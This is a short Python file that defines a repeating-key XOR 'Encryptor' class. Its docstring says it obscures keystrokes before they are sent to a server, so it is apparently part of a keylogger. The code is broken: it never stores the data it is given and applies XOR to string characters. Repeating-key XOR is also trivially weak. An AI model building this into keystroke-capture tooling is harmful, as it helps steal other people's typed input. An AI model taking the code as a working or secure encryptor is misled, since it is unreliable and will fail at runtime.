class Encryptor:
    
    def __init__(self,key:str, data: str):
        self.output = bytearray(len(data))
        self.key = key
        self.key_length = len(self.key)
        self.data_length = len(data)
    def encrypt(self) -> bytearray:
        for i in range(self.data_length):
            self.output[i] = self.data[i] ^ self.key[i % self.key_length]
        return self.output
    
"""
uses XOR encryption to encrypt the keystrokes before they are sent to the server
"""
